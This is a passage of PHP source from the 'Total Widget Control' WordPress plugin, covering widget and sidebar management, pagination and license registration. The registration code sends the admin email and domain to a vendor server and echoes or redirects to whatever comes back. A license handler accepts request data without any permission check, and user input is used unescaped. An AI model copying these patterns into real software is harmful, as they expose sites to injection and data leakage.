	return $_REQUEST['twcp_filter'];
}

/**
 * Get the current page
 * 
 * Function is responsible for loading the current screen object which defines the
 * current page as the admin widget page.
 * 
 * @return unknown
 */
function twc_get_current_screen()
{
	//initializing variables
	static $current_screen;
	
	if (isset($current_screen)) return $current_screen;
	
	//initializing variables
	$parts = pathinfo($_SERVER['PHP_SELF']);
	$parent_file = apply_filters("twc_parent_file", $parts['basename']); // 'themes.php' For plugins to move submenu tabs around.
	
	$current_screen = new stdClass();
	$current_screen->parent_file = $parent_file;
	$current_screen->parent_base = preg_replace('/\?.*$/', '', $parent_file);
	$current_screen->parent_base = str_replace('.php', '', $current_screen->parent_base);
	$current_screen->id = 'twc-widgets';
	$current_screen->base = 'widgets';
	
	if ($GLOBALS['TWCAUTH'] && !isset($_REQUEST['action']))
	{
		$current_screen->action = 'auth';
	}
	else
	{
		$current_screen->action = strtolower($_REQUEST['action']);
	}
	
	return $current_screen;
}

/**
 * Function is responsible for loading the widget, validating its variables
 * and loading the widgets parameters.
 *
 * @param string $widget_id
 * @return static reference array $widget
 */
function &twc_get_widget_by_id( $widget_id )
{
	//initializing variables
	global $wp_registered_widgets;
	static $twc_registered_widgets;
	$widget = @$wp_registered_widgets[$widget_id];
	
	if (!isset($twc_registered_widgets))
	{
		$twc_registered_widgets = array();
	}
	
	//reasons to fail
	if (isset($twc_registered_widgets[$widget_id])) return $twc_registered_widgets[$widget_id];
	if (!$widget) return false;
	
	//initializing widget variables
	$widget['id'] = $widget_id;
	$widget['id_base'] = _get_widget_id_base($widget_id);
	$widget['number'] = absint(str_replace($widget['id_base'], '', $widget_id));
	$widget['multiwidget'] = (isset($widget['number']) && $widget['number']);
	$widget['sidebar_id'] = twc_get_widgets_sidebar( $widget_id );
	$widget['position'] = twc_get_widgets_sidebar( $widget_id, 'position' );
	$widget['p'] = array();
	
	//validating the widget identification
	@$widget['params'][0]['number'] = $widget['number'];
	if (is_object( $widget['callback'][0] ))
	{
		$widget['callback'][0]->number = $widget['number'];
		$widget['callback'][0]->id = $widget['id'];
	}
	
	//loading settings
	if (is_callable( array($widget['callback'][0], 'get_settings') ))
	{
		$params = $widget['callback'][0]->get_settings();
		$widget['p'] = $params[$widget['number']];
	}
	elseif ( !$widget['multiwidget'] )
	{
		//take the data handling into our own hands if this is not a multiwidget
		$singles = get_option('twc_single_widget_data', array());
		$widget['p'] = $singles[$widget['id']];
	}
	
	$twc_registered_widgets[$widget_id] = $widget;
	return $widget;
}

/**
 * Function is responsible for branding wordpress a little :)
 *
 * @param unknown_type $text
 * @return unknown
 */
function twc_gettext( $text )
{
	//initializing variables
	$current_screen = twc_get_current_screen(); 
	$base = $current_screen->parent_base;
	
	$lan = array(
		'themes' => array(
			'Screen Options' => _('5Twenty Studios')
		),
	);
	
	if (isset($lan[$base]) && isset($lan[$base][$text]))
	{
		$text = $lan[$base][$text];
	}
	
	return $text;
}

/**
 * function returns the position and the sidebar for a given widget
 * 
 * @TODO Need to create a separate function that will be called to return the position value
 * @TODO This function should only return a sidebar as a value, if the type is sidebar
 * 
 * @param unknown_type $widget_id
 * @param unknown_type $type
 * @return unknown
 */
function twc_get_widgets_sidebar( $widget_id, $type = 'sidebar' )
{
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	static $flipped;
	
	if (!isset($flipped))
	{
		unset($sidebars_widgets['wp_inactive_widgets']);
		foreach ((array)$sidebars_widgets as $_sidebar => $widgets)
		{
			foreach ((array)$widgets as $position => $widgetid)
			{
				$flipped[$widgetid] = array(
						'sidebar' => $_sidebar,
						'position' => (int)trim($position),
					);
			}
		}
	}
	
	//return sidebar info
	if ($type == 'position')
	{
		if (!isset($flipped[$widget_id][$type]))
		{
			return 0;
		}
		else
		{
			return $flipped[$widget_id][$type];
		}
	}
	else // if sidebar
	{
		if (!isset($flipped[$widget_id][$type]))
		{
			return 'wp_inactive_widgets';
		}
		else
		{
			return $flipped[$widget_id][$type];
		}
	}
}

/**
 * this function adds the 'add new' button to the list page
 *
 */
function twc_h2_add_new()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	if ($current_screen->action != '') return;
	
	echo '<a href="'.get_bloginfo('url').'/wp-admin/widgets.php?action=add" class="button add-new-h2">'.__('Add New','twc').'</a>';
}

/**
 * This does our checking to see if the current view is for active of 
 * inactive widgets
 *
 * @return boolean
 */
function twc_inactive_list()
{
	return (isset($_REQUEST['inactive']) && $_REQUEST['inactive'] == 'inactive');
}

/**
 * This initializes the twc system with the proper hooks.
 *
 * @return null
 */
function twc_initialize()
{
	//initializing variables
	global $twc_table_type, $twc_widgetlistings_type, $twc_has_displayed;
	$twc_table_type = $twc_widgetlistings_type = 'default';
	$twc_has_displayed = false;
	
	wp_register_script( 'twc-nav-menu', plugin_dir_url(__file__).'js/twc-nav-menu.js');
	wp_register_script( 'twc-base', plugin_dir_url(__file__).'js/twc.js');
	wp_register_script( 'twc-qtip', plugin_dir_url(__file__).'js/tooltips.js');
	wp_register_script( 'twc-sortables', plugin_dir_url(__file__).'js/sortables.js');
	
	wp_register_style( 'twc', plugin_dir_url(__file__).'css/twc.css');
	wp_register_style( 'twc-sortables', plugin_dir_url(__file__).'css/twcSortables.css');
	
	add_shortcode('twc_show_widget', 'twc_shortcode_widget');
	add_shortcode('twc_show_sidebar', 'twc_shortcode_sidebar');
	
	add_action('activate_'.plugin_basename(dirname(__file__)).DS.'index.php', 'twc_activate_plugin');
	add_action('deactivate_'.plugin_basename(dirname(__file__)).DS.'index.php', 'twc_deactivate_plugin');
	add_action('sidebar_admin_setup', 'twc_init', 100);
	add_action('admin_notices', 'twc_view_switch', 1);
	add_action('admin_init', 'twc_set_object_id');
	add_action('init', 'twc_clear_license',1);
	add_action('init', 'twc_clear_originals',1);
	add_action('init', 'twc_add_javascript');
	add_action('init', 'show_ajax', 100);
	add_action('init', 'twc_registration', 1);
	add_action('init', 'twc_receive_license', 1);
	add_action('twc_init', 'twc_admin_notices');
	add_action('twc_init', 'twc_view_widget_wrap', 20);
	add_action('twc_init', 'twc_destruct', 100);
	add_action('twc_display_admin', 'twc_view_auth');
	add_action('twc_display_admin', 'twc_register');
	add_action('twc_display_admin', 'twc_manual_license');
	add_action('twc-register', 'twc_register');
	add_action('twc-table', 'twc_rows', 10);
	add_action('widgets_init', 'init_registered_widgets', 1);
	add_action('twc-free-registration', 'twc_activation' );
	add_action('admin_menu', 'f20_add_metaboxes');
	add_action('save_post', 'f20_metabox_save_data');
	add_action('wp_footer','twc_show_object_id');
	add_action('wp', 'twc_sortable_initialize');
	add_action('wp','twc_set_object_url');
	add_action('twc_empty_sidebar','twc_sidebar_originals', 20, 1);
	
	add_filter('twc-save-widget-fields','twc_save_menu_items',20,1);
	add_filter('gettext', 'twc_gettext');
	add_filter('plugin_action_links_total-widget-control/index.php', 'twc_add_action_links');
	add_filter('plugin_row_meta', 'twc_plugin_row_meta', 10, 2);
	add_filter('twc_widget_display', 'twc_sortable_wrapper', 1000, 2);

	function twc_manual_license(){twc_show_view('twc-manual-license');}
	function twc_register(){ twc_show_view('twc-register'); }
	function twc_init(){ if (!twc_list_style_twc()) return; do_action('twc_init'); }
	function twc_destruct(){ _520(); exit(); }
	function twc_admin_notices(){ add_action('admin_notices', 'read_520_rss'); }
	function twc_view_screen_options(){ return twc_get_show_view('twc-screen-options'); }
	function twc_view_help_home(){ return twc_get_show_view('twc-help-home'); }
	function twc_view_help_edit(){ return twc_get_show_view('twc-help-edit'); }
	function twc_view_help_add(){ return twc_get_show_view('twc-help-add'); }
	function twc_view_widget_wrap(){ twc_show_view('twc-widget-wrap'); }
	function twc_view_auth(){ twc_show_view('twc-auth'); }
	if (!array_key_exists('TWCAUTH', $GLOBALS)) $GLOBALS['TWCAUTH'] = true;
	
	f20_register_metabox(array(
	    'id' => 'my-meta-box',
	    'title' => 'Total Widget Control',
	    'page' => true,
	    'context' => 'normal',
	    'priority' => 'high',
	    'fields' => array(
	        array(
	            'name' => '',
	            'desc' => '',
	            'id' => 'twc-meta-listings',
	            'type' => 'show_view',
	            'std' => ''
	        ),
	    )
	));
}

/**
 * function is responsible to determine if the widget will display on this page.
 *
 * @param string|object $widget
 * @return boolean
 */
function twc_is_widget_displaying( $widget )
{
	//initializing variables
	if (is_string($widget))
	{
		$widget = twc_get_widget_by_id($widget);
	}
	
	//is active for current page
	if (twc_get_object_id())
	{
		$display = (is_array($widget['p']['menu_item_object_id']) && in_array(twc_get_object_id(), (array)$widget['p']['menu_item_object_id']));
	}
	else 
	{
		$display = (is_array($widget['p']['menu_item_urls']) && in_array(twc_get_object_url(), (array)$widget['p']['menu_item_urls']));
	}
	
	//is active for parent
	if (!$display && $widget['p']['twcp_inherit_sidebar'] == 'inherit')
	{
		if ($id = twc_get_object_id()) if ($parents = get_post_ancestors($id))
		{
			foreach ((array)$parents as $parent_id)
			{
				if (!in_array($parent_id, $widget['p']['menu_item_object_id'])) continue;
				$display = true;
				break;
			}
		}
	}
	
	return $display;
}

/**
 * This function manages the view style. Upon first call it will check
 * which view is to be used.
 *
 * @return boolean
 */
function twc_list_style_twc()
{
	//initializing variables
	static $view;
	global $current_user;
	get_currentuserinfo();
	
	if (!isset($view) && $style = $_REQUEST['list_style']) //querystring
	{
		$view = $style;
	}
	elseif (!isset($view)) //db
	{
		$view = get_user_option( 'twc_list_style', $current_user->ID );
	}
	else //already set
	{
		return ($view == 'twc');
	}
	
	update_user_option($current_user->ID, 'twc_list_style', $view);
	return ($view == 'twc');
}

/**
 * function is responsible for adjusting the plugin meta links on the plugin page
 *
 * @param array $plugin_meta
 * @param string $plugin_file
 * @return array $plugin_meta
 */
function twc_plugin_row_meta( $plugin_meta, $plugin_file )
{
	//reasons to fail
	if ('total-widget-control/index.php' != $plugin_file) return $plugin_meta;
	
	//initializing variables
	if (isset($plugin_meta[2])) unset($plugin_meta[2]);
	$plugin_meta[] = '<a href="http://community.5twentystudios.com/?kb" target="_blank">'.__('Documentation','twc').'</a>';
	$plugin_meta[] = '<a href="http://community.5twentystudios.com/community/" target="_blank">'.__('Support Forum','twc').'</a>';
	$plugin_meta[] = '<a href="http://community.5twentystudios.com/software-products/total-widget-control/extra-widgets/" target="_blank">'.__('Get More Widgets','twc').'</a>';
	
	return $plugin_meta;
}

/**
 * Function returns a drop down of the current widgets position
 *
 * @param unknown_type $sidebar_id
 * @param unknown_type $default
 */
function twc_position_select_box( $sidebar_id, $default )
{
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$list = $sidebars_widgets[$sidebar_id];
	
	$select = '<select id="'.$sidebar_id.'_position'.'" name="'.$sidebar_id.'_position'.'" class="twc_sidebar_select_box">';
	
	if (count($list) == 0)
	{
		$select .= "<option value='0'>0</option>";
	}
	
	for ($i = 1; $i <= count($list); $i++)
	{
		$selected = '';
		if ($default == ($i-1)) $selected = 'selected=selected';
		$select .= "<option $selected value='".($i-1)."'>$i</option>";
	}
	return $select.'</select>';
}

/**
 * function creates the wrapper folder and returns a list of files
 * within that folder.
 * 
 * @TODO Function should also copy the default wrappers to the created folder
 *
 * @return unknown
 */
function twc_read_wrapper_files()
{
	//initializing variables
	$themepath = TwcPath::clean(get_theme_path().DS.'widget-wrappers'.DS);
	$pluginpath = TwcPath::clean(dirname(__file__).DS.'widget-wrappers'.DS);
	
	if (!is_dir($themepath)) TwcPath::create($path, 0777);
	
	$themefiles = TwcPath::byrd_files($themepath, $filter = '.', $recurse = false, $fullpath = true);
	$pluginfiles = TwcPath::byrd_files($pluginpath, $filter = '.', $recurse = false, $fullpath = true);
	$files = (array)$themefiles + (array)$pluginfiles;
	
	$headers = array(
		'wrapperTitle' => __('Wrapper Title','twc'),
		'description' => __('Description','twc'),
	);
	
	foreach ($files as $file)
	{
		if (!file_exists($path.$file)) continue;
		$file_data[$file] = get_file_data($path.$file, $headers);
	}
	
	return $file_data;
}

/**
 * Builds the row data, we do this outside of the model, for pagination purposes.
 *
 * @param string $action
 * @return null
 */
function twc_rows( $action = 'default' )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twcp_pagi, $twc_rows;
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$sidebars = array();
	$current_screen = twc_get_current_screen();
	$twc_rows = array();
	$twcp_pagi = apply_filters('twcp_pagination_defaults', array(
		'total' => 0,
		'per_page' => 20,
		'page' => (isset($_REQUEST['pa'])) ?$_REQUEST['pa'] :1,
		'pages' => '',
		'start' => '',
		'stop' => '',
	));
	
	//reasons to fail
	if (!empty($current_screen->action) && $action == 'default') return false;
	
	foreach ($wp_registered_sidebars as $sidebar_slug => $sidebar): 
		if (is_array($sidebars_widgets[$sidebar_slug]))
		foreach ($sidebars_widgets[$sidebar_slug] as $position => $widget_slug): 
			
			switch ($action)
			{
				case 'on-page':
					//initializing variables
					$widget = twc_get_widget_by_id($widget_slug);
					$display = twc_is_widget_displaying($widget);
					
					//reasons to continue
					$display = apply_filters('twc_display_widget', $display, $widget);
					if (!$display) continue;
						
					//setting variables
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = $widget;
					
					break;
				default:
				//show inactive widgets
				if (twc_inactive_list() && $sidebar_slug == 'wp_inactive_widgets')
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					continue;
				}
				
				//show filtered items
				if (twc_filter_list_for() && twc_filter_list_for() != $sidebar_slug)
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					continue;
				}
				
				//show searched for items
				if (twc_search_list_for() && $search = twc_search_list_for())
				{
					$widget = twc_get_widget_by_id( $widget_slug );
					$title = apply_filters('twc_widget_title', ((isset($widget['p']['title'])) ?$widget['p']['title'] :''), $widget);
					
					if (strpos(strtolower($title),strtolower($search)) !== false)
					{
						$twcp_pagi['total']++;
						$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					}
					continue;
				}
				
				//show only active items
				if (!twc_inactive_list() && $sidebar_slug != 'wp_inactive_widgets')
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					continue;
				}
				break;
			}
			
		endforeach;
	endforeach;
	
	//calculate the number of pages
	$twcp_pagi['pages'] = ceil(($twcp_pagi['per_page'] > 0) ?$twcp_pagi['total'] / $twcp_pagi['per_page'] :1);
	$twcp_pagi['start'] = ($twcp_pagi['per_page'] * $twcp_pagi['page']);
	$twcp_pagi['start'] = ($twcp_pagi['start'] >= $twcp_pagi['per_page']) ?$twcp_pagi['start'] - $twcp_pagi['per_page']+1 :$twcp_pagi['start'];
	$twcp_pagi['stop'] = $twcp_pagi['per_page'] * $twcp_pagi['page'];
	$twcp_pagi['stop'] = ($twcp_pagi['stop'] == 0) ?$twcp_pagi['stop'] + $twcp_pagi['per_page'] :$twcp_pagi['stop'];
	$twcp_pagi['stop'] = ($twcp_pagi['stop'] > $twcp_pagi['total']) ? $twcp_pagi['total'] :$twcp_pagi['stop'];
	$twcp_pagi = apply_filters('twcp_pagination', $twcp_pagi);
}

/**
 * This takes care of the alternating row colors without all the messy code
 * in my table rows
 */
function twc_row_alternate()
{
	//initializing variables
	static $alternate;
	
	if (!isset($alternate))
	{ 
		$alternate = 0;
	}
	else
	{
		$alternate++;
	}
	
	if ($alternate)
	{
		$alternate = -1;
		echo 'alternate';
	}
}

/**
 * registers the inactive widgets sidebar
 * 
 * @return null
 */
function twc_register_placeholder_sidebar()
{
	// register the inactive_widgets area as sidebar
	register_sidebar(array(
		'name' => __('Inactive Widgets'),
		'id' => 'wp_inactive_widgets',
		'description' => '',
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '',
		'after_title' => '',
	));
}

/**
 * function is responsible for pinging for a license and redirecting if necessary
 *
 * @return unknown
 */
function twc_registration()
{
	//loading libraries
	require_once ABSPATH.'wp-admin'.DS.'includes'.DS.'plugin.php';
	
	//initializing variables
	global $twc_paypal;
	$twc_paypal = false;
	$current_screen = twc_get_current_screen();
	$first = get_option('twc_unique_registration_key', true);
	$uniqueID = get_option('twc_unique_registration_key', create_guid());
	update_option('twc_unique_registration_key', $uniqueID);
	
	//reasons to fail
	if ($current_screen->action != 'register') return false;
	if (isset($_REQUEST[$uniqueID]) || !isset($_REQUEST['license'])) return false;
	
	//initializing variables
	$headers = get_plugin_data( dirname(__file__).DS.'index.php' );
	$domain = 'http://'.str_replace('http://', '', $_SERVER['HTTP_HOST']);
	
	switch($_REQUEST['license'])
	{
		case '1': case '2': 
			remove_all_actions("twc_display_admin");
			add_action('twc_display_admin', 'twc_register');
			$type = 'twc-pro'; 
			break;
		case '10': return; break;
		default: 
			$type = 'twc-free';
			break;
	}
	
	$path = "http://community.5twentystudios.com/?view=register-for-free&email=".
		get_bloginfo('admin_email')."&ver=".urlencode($headers['Version']).
		"&domain=".urlencode($domain)."&type=$type&unique=$uniqueID&return_url=".
		urlencode(get_bloginfo('url'));
	
	if (ini_get('allow_url_fopen') && $twc_paypal = trim(@file_get_contents($path)))
	{
		
	}
	else 
	{
		$curl = curl_init($path);
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);

	    $twc_paypal = trim(curl_exec($curl));
	    if(curl_errno($curl))
		{
		    error_log('twc curl error: '.' '.curl_error($ch).'; results: '.$result);
		}
		curl_close($curl);
	}
	
	if ($type == 'twc-free')  
		do_action('twc-free-registration'); 
	
	if ($twc_paypal)
	{
		if (!headers_sent())
		{
			$twc_paypal = trim(str_replace("\r\n", '', $twc_paypal));
			if (substr($twc_paypal,0,7) != 'http://' && substr($twc_paypal,0,8) != 'https://')
			{
				echo $twc_paypal;
			}
			else
			{
				wp_redirect($twc_paypal);
			}
			exit();
		}
	}
	return false;
}

/**
 * function is responsible for saving the license file if its sent
 *
 * @return false
 */
function twc_receive_license()
{
	//initializing variables
	$uniqueID = get_option('twc_unique_registration_key', false);
	$domain = 'http://'.str_replace('http://', '', $_SERVER['HTTP_HOST']);
	$parts = parse_url($domain);
	
	//reasons to fail
	if (!isset($_REQUEST[$uniqueID])) return false;
	
	$licenses = get_option('twc_licenses',array());
	$licenses[$parts['host']] = $_REQUEST[$uniqueID];
	update_option('twc_licenses',$licenses);
	
	return die('done : success');
}

/**
 * Function appends the widget wrapper values to the instance fields
 *
 * 
 * @param array $fields
 * @return array
 */
function twc_save_default_sidebar( $fields, $new_instance, $old_instance, $widget )
{
	//initializing variables
	$fields = wp_parse_args( $fields, $old_instance );
	$request = wp_parse_args((array)$_POST['widget-'.$widget->id_base][$widget->number], $_REQUEST);
	
	if (array_key_exists('twcp_default_sidebar', $request))
		$fields['twcp_default_sidebar'] = $request['twcp_default_sidebar'];
	
	if (array_key_exists('twcp_exclude_sidebar', $request))
		$fields['twcp_exclude_sidebar'] = $request['twcp_exclude_sidebar'];
	
	if (array_key_exists('twcp_inherit_sidebar', $request))
		$fields['twcp_inherit_sidebar'] = $request['twcp_inherit_sidebar'];
	
	if (array_key_exists('twcp_wrapper_file', $request))
		$fields['twcp_wrapper_file'] = $request['twcp_wrapper_file'];
	
	if (array_key_exists('twcp_widget_title', $request))
		$fields['twcp_widget_title'] = $request['twcp_widget_title'];
	
	if (array_key_exists('twcp_status', $request))
		$fields['twcp_status'] = $request['twcp_status'];
	
	if (array_key_exists('twcp_visibility', $request))
		$fields['twcp_visibility'] = $request['twcp_visibility'];
	
	if (array_key_exists('twcp_publish_time', $request))
		$fields['twcp_publish_time'] = $request['twcp_publish_time'];
	
	if (array_key_exists('twcp_visible_parent', $request))
		$fields['twcp_visible_parent'] = $request['twcp_visible_parent'];
	
	return $fields;
}

/**
 * Function appends the menu item data to the instance fields
 * 
 * @TODO Need to also save the object type
 * @param array $fields
 * @return array $fields
 */
function twc_save_menu_items( $fields )
{
	//reasons to fail
	if (!array_key_exists('menu-item', $_REQUEST)) return $fields;
	
	//initializing variables
	$object_ids = array();
	$menu_item_urls = array();
	
	foreach ((array)$_REQUEST['menu-item'] as $item) 
		foreach ((array)$item as $menu_item => $id)
		{
			//saving the menu item url
			if ($menu_item == 'menu-item-url')
			{
				$menu_item_urls[$id] = $id;
			}
			
			//saving the object ID
			if ($menu_item == 'menu-item-object-id') 
			{
				$object_ids[$id] = $id;
			}
		}
	
	$fields['menu_item_object_id'] = $object_ids;
	$fields['menu_item_urls'] = $menu_item_urls;
	return $fields;
}

/**
 * Function accepts the widget id and the sidebar and saves the 
 * relationship.
 *
 * @param string $widget_id
 * @param string $sidebar_id
 */
function twc_save_widget_sidebar( $widget_id, $sidebar_id, $position = 0, $delete = false )
{
	if (!$widget_id || !current_user_can('activate_plugins'))
		return false;
	
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	// remove old position
	foreach ( $sidebars_widgets as $key => $sb )
	{
		$sidebars_widgets[$key] = array_diff( (array)$sb, array($widget_id) );
	}
	
	array_splice( $sidebars_widgets[$sidebar_id], $position, 0, $widget_id );
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * This function accepts fields for a given widget and saves those fields to the db.
 *
 * @param string $widget_id
 * @param array $fields
 */

function twc_save_widget_fields( $widget_id, $post )
{
	//initializing variables
	if (!$widget_id || !current_user_can('activate_plugins'))
	{
		wp_redirect(get_bloginfo('url').'/wp-admin/widgets.php?message=0');
		exit;
	}
	
	//initializing variables
	global $wp_registered_widget_updates;
	$fields = $post;
	$_POST = array();
	$widget = twc_get_widget_by_id($widget_id);
	$id_base = _get_widget_id_base($widget['id']);
	$ignore = array('sidebar_slug','id_base','widget-width','widget-height',
	'widget_number','multi_number','action','redirect','editwidget','addnew','base','num',
	'view');
	
	
	if ($widget['multiwidget'])
	{
		//variable as constructed by wordpress
		if (isset($post['widget-'.$id_base])
		&& isset($post['widget-'.$id_base][$widget['number']]))
		{
			$fields = $post['widget-'.$id_base][$widget['number']];
		}
	}
	
	//filtering the fields
	foreach ($fields as $key => $value)
	{
		if (in_array($key, (array)$ignore))
		{
			unset($fields[$key]);
		}
	}
	

	if ($widget['multiwidget'])
	{
		$_POST['widget-'.$id_base][$widget['number']] = apply_filters('twc-save-widget-fields', $fields);
		$_POST['multi_number'] = $widget['number'];
	}
	else
	{
		$_POST = apply_filters('twc-save-widget-fields', $fields);
		
		//take the data handling into our own hands if this is not a multiwidget
		$singles = get_option('twc_single_widget_data', array());
		$singles[$widget['id']] = $_POST;
		update_option('twc_single_widget_data', $singles);
	}
	
	//this calls the widgets update function with the given params
	foreach ( (array) $wp_registered_widget_updates as $name => $control )
	{
		if ( $name != $id_base || !is_callable($control['callback']) )
			continue;
	
		ob_start();
			call_user_func_array( $control['callback'], $control['params'] );
		ob_get_clean();
		break;
	}
	return true;
}

/**
 * 
 *
 * @return unknown
 */
function twc_search_list_for()
{
	if (!isset($_REQUEST['twcp_search_input']) || empty($_REQUEST['twcp_search_input'])) return false;
	$_REQUEST['inactive'] = 'active';
	
	return $_REQUEST['twcp_search_input'];
}

/**
 * function is responsible for setting the current url
 *
 */
function twc_set_object_url()
{
	//initializing variables
	global $twc_menu_item_url;
	
	//reasons to fail
	if (isset($twc_menu_item_url)) return $twc_menu_item_url;
	$twc_menu_item_url = f20_get_page_url();
	return $twc_menu_item_url;
}

/**
 * Save the original object id
 * 
 * @return string $twc_menu_item_object_id
 */
function twc_set_object_id()
{
	//initializing variables
	global $wp_query;
	static $twc_menu_item_object_id;
	
	//reasons to fail
	if (isset($twc_menu_item_object_id)) return $twc_menu_item_object_id;
	
	if (!isset($wp_query))
	{
		wp_reset_query();
	}
	
	if (!$wp_query->have_posts())
	{
		//this is used for the admin area
		if (isset($_REQUEST['post']) && $post = get_post($_REQUEST['post']))
		{
			if ($post->post_type == 'page')
			{
				$query = array('page_id' => $post->ID);
			}
			else
			{
				$query = array('p' => $post->ID, 'post_type' => 'any');
			}
		}
		$wp_query->query($query);
	}
	
	//now that the wp_query is setup, we get the object id
	$wp_query->get_queried_object();
	$twc_menu_item_object_id = $wp_query->queried_object_id;
	return $twc_menu_item_object_id;
}

/**
 * function shows debug info
 * 
 * @return unknown
 */
function twc_show_object_id()
{
	//initializing varaibles
	$debug_locations = (isset($_REQUEST['twc_debug']));
	
	//reasons to fail
	if ( TWC_CURRENT_USER_CANNOT ) return false;
	if (!$debug_locations) return false;
	echo '<div style="position:absolute;top:0px;left:0px;background:#fff;padding:5px;">'.twc_get_object_id().'</div>';
}

/**
 * function is responsible for displaying the original widgets
 *
 * @return null
 */
function twc_sidebar_originals( $sidebar_id )
{
	//initializing variables
	$originals = get_option('twc_first_activate', false);
	
	//reasons to fail
	if (!$originals[$sidebar_id]) return false;
	
	foreach ($originals[$sidebar_id] as $sidebar_id => $widget_id)
	{
		twc_display_the_widget(null, $widget_id, null, true);
	}
}

/**
 * Just prints a sidebar
 *
 * @param unknown_type $default
 * @return unknown
 */
function twc_sidebar_select_box( $default = 'wp_inactive_widgets', $widget = null, $format = false, $name = null )
{
	//initializing variables
	global $wp_registered_sidebars;
	$sidebars = $wp_registered_sidebars;
	$class = array('','selected="true"');
	$select_filter = '';
	
	if (!is_null($name))
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
	}
	elseif ($format)
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
		$name = 'sidebar';
	}
	elseif (!is_null($widget))
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
		$name = 'widget-'.$widget['id_base'].'['.$widget['number'].'][sidebar_slug]';
	}
	
	$select = '<select id="'.$id.'" name="'.$name.'" class="twc_sidebar_select_box">'.$select_filter;
	
	foreach ($sidebars as $slug => $sidebar)
	{
		$selected = 0;
		if ($default == $slug) $selected = 1;
		$select .= "<option {$class[$selected]} value='$slug'>{$sidebar['name']}</option>";
	}
	
	return $select.'</select>';
}

/**
 * Just prints a filter sidebar
 * 
 * @return unknown
 */
function twc_sidebar_filter_box()
{
	//initializing variables
	global $wp_registered_sidebars;
	$sidebars = $wp_registered_sidebars;
	$class = array('','selected="true"');
	$default = twc_filter_list_for();
	
	$select = '<select name="twcp_filter" class="twc_sidebar_filter_box">'
			. '<option value="">  -  '.__('Remove Filter','twc').'  -  </option>';
		
	foreach ($sidebars as $slug => $sidebar)
	{
		$selected = 0;
		if ($default == $slug) $selected = 1;
		$select .= "<option {$class[$selected]} value='$slug'>{$sidebar['name']}</option>";
	}
	
	return $select.'</select>';
}

/**
 * function is responsible for putting the widget back together.
 * This function also keeps track of the widget loop within the dynamic_sidebar.
 * Once the dynamic_sidebar function is completed, we declare a do_action to
 * activate our own sidebar function.
 *
 * @param unknown_type $widget
 */
function twc_trigger_sidebar( $widget_shell )
{
	//initializing variables
	global $wp_registered_widgets, $twc_wp_registered_widgets;
	static $keeping_count;
	$debug_locations = (isset($_REQUEST['twc_debug']));
	$sidebar_id = twc_get_widgets_sidebar($widget_shell['id']);
	$count = twc_count_sidebar_widgets($sidebar_id);
	
	if (!isset($keeping_count))
	{
		$keeping_count = 0;
	}
	$keeping_count++;
	
	if ($count == $keeping_count)
	{
		//ensures that we have a well formed widget variable before calling our sidebar
		$wp_registered_widgets = $twc_wp_registered_widgets;
		if ($debug_locations) echo '<div style="border: 1px dashed pink;min-height:25px;"><b>'.$sidebar_id.'</b>';
		if (TWC_IS_SORTER) echo '<div class="twc_sortable_sidebar">';
		
		do_action('twc_dynamic_sidebar', $sidebar_id);
		
		if (TWC_IS_SORTER) echo '</div>';
		if ($debug_locations) echo '</div>';
		
		$keeping_count = 0;
	}
	
}

/**
 * Button encourages the user to upgrade to pro
 *
 */
function twc_upgrade_button()
{
	if (function_exists('twc_widget_protitle')) return;
	echo '<a class="twc_upgrade_button button-primary" href="'.get_bloginfo('url').'/wp-admin/widgets.php?action=register&license=1">'.__('Upgrade to Pro $9','twc').'</a>';
}

/**
 * This function adds the view switches to the wordpress widget page
 * 
 * @return unknown
 */
function twc_view_switch()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	
	//reasons to fail
	if ((!$GLOBALS['TWCAUTH']) && (twc_list_style_twc() 
	|| $current_screen->parent_base != 'widgets')) return false;
	
	echo '<div>'.twc_get_show_view('twc-view-switch').'</div>';
	
}

/**
 * Function sets the global $widget variable
 *
 * @return null
 */
function twc_widget_global()
{
	//initializingn variables
	global $widget;
	$widget_id = (isset($_REQUEST['widget_id']))? $_REQUEST['widget_id']: ((isset($_REQUEST['widget-id']))? $_REQUEST['widget-id'] : ((isset($_REQUEST['editwidget']))? $_REQUEST['editwidget']: false));
	
	//loading resources
	$widget = twc_get_widget_by_id( $widget_id );
	
	//reasons to return
	if (!$widget) return;
	
}

/**
 * Function returns the widgets grouped by sidebar
 *
 * @return unknown
 */
function twc_wp_get_sidebars_widgets()
{
	$sidebars_widgets = wp_get_sidebars_widgets();
	if ( empty( $sidebars_widgets ) )
		$sidebars_widgets = wp_get_widget_defaults();
	
	return $sidebars_widgets;
}

/**
 * Function is paving the way for the front end sortables for administrators
 *
 * @param string $display
 * @param object $widget
 * @return string
 */
function twc_sortable_wrapper( $display, $widget )
{
	$t = '';
	if (TWC_IS_SORTER) $t .= '<div class="twc_sortable_widget" id="twc-'.$widget['id'].'" position="'.$widget['position'].'">';
	$t .= $display;
	if (TWC_IS_SORTER) $t .= '</div>';
	
	return $t;
}

/**
 * wraps the widget display
 *
 * @param unknown_type $display
 * @param unknown_type $widget
 * @return unknown
 */
function twcp_widget_wrapper( $display, $widget )
{
	//initializing variables
	global $twc_widget_to_wrap, $twc_widget;
